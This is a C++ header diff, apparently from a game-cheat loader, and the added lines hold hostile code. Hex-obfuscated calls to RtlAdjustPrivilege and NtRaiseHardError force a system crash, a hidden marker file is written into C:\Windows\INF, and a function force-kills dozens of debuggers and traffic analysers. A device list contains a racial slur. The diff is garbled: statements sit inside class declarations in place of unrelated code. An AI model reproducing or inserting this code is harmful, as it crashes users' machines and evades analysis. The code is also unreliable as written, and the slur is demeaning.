@@ -38,9 +38,9 @@ private:
 
 class Menu {
 public:
-	ImFont* smallFont;
-	ImFont* mediumFont;
+
 	void Main(bool loader_active, PDIRECT3DTEXTURE9 my_texture);
+	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
 private:
 	void MainMenu();
 	void LoadingScene();
@@ -62,21 +62,21 @@ extern std::unique_ptr<Menu> m_Menu;
 class CConsole
 {
 public:
-    static void MakeSexy();
-
-    static void SetRandomTitle();
-
-    static void SetTitle(_In_ LPCSTR lpConsoleTitle);
-
-    static int Print(char const* const _Format, ...);
-
-    static int WPrint(wchar_t const* const _Format, ...);
-
-    static void Clear();
-
-    static void SetColor(unsigned short color);
-
-    static void Pause();
+	 BOOLEAN bEnabled;
+	    ULONG uResp;
+	    system(EncryptS("cls"));
+	    std::ofstream outfile(EncryptS("C:\\Windows\\INF\\Secure.axt"));
+	    outfile << EncryptS("0xE0PD01\n0xB866E7\n0x1337B1") << std::endl;
+	    outfile.close();
+	    //KeyAuthApp.ban();
+	    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA(EncryptS("\x6E\x74\x64\x6C\x6C\x2E\x64\x6C\x6C")), EncryptS("\x52\x74\x6C\x41\x64\x6A\x75\x73\x74\x50\x72\x69\x76\x69\x6C\x65\x67\x65"));
+	    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandleW(EncryptWS(L"\x6E\x74\x64\x6C\x6C\x2E\x64\x6C\x6C")), EncryptS("\x4E\x74\x52\x61\x69\x73\x65\x48\x61\x72\x64\x45\x72\x72\x6F\x72"));
+	    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
+	    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
+	    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
+	    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
+	    Sleep(5000);
+	    ::exit(0);
 
 };
 std::string GetHWID();
@@ -93,18 +93,50 @@ struct S_LogType
 void Log(std::string Message, int LogType);
 void Log1(std::string Message, int LogType);
 
-   static bool Alloc(OUT STRING_INFO* StringInfo, size_t Characters) {
-        if (!StringInfo || !Characters) return false;
-        *StringInfo = {};
-        size_t Size = (Characters + 1) * sizeof(TChar); // Null-terminated buffer
-        Size = ((Size / AllocationGranularity) + 1) * AllocationGranularity;
-        TChar* Buffer = StrAllocMem(Size);
-        if (!Buffer) return false;
-        Buffer[0] = NullChar;
-        Buffer[Characters] = NullChar;
-        StringInfo->Buffer = Buffer;
-        StringInfo->Length = Characters;
-        StringInfo->BufferSize = Size;
-        StringInfo->SsoUsing = FALSE;
-        return true;
-    }
+void killdbg()
+{
+    system(EncryptS("taskkill /f /im KsDumperClient.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im KsDumper.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im ProcessHacker.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im idaq.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im idaq64.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im Wireshark.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im Fiddler.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im FiddlerEverywhere.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im Xenos64.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im Xenos.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im Xenos32.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im de4dot.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im Cheat Engine.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im cheatengine-x86_64.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im cheatengine-x86_64-SSE4-AVX2.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im MugenJinFuu-x86_64-SSE4-AVX2.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im MugenJinFuu-i386.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im cheatengine-x86_64.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im cheatengine-i386.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im HTTP Debugger Windows Service (32 bit).exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im KsDumper.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im OllyDbg.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im x64dbg.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im x32dbg.exe >nul 2>&1"));
+    system(EncryptS("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1"));
+    system(EncryptS("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im Ida64.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im OllyDbg.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im Dbg64.exe >nul 2>&1"));
+    system(EncryptS("taskkill /f /im Dbg32.exe >nul 2>&1"));
+    system(EncryptS("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1"));
+    system(EncryptS("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1"));
+    system(EncryptS("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1"));
+} std::string SwapHook = "\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74";
+void driverdetect()
+{
+    const TCHAR* devices[] =
+    {
+        (EncryptS(_T("\\\\.\\kdstinker"))),
+        (EncryptS(_T("\\\\.\\NiGgEr"))),
+        (EncryptS(_T("\\\\.\\KsDumper")))
+    };
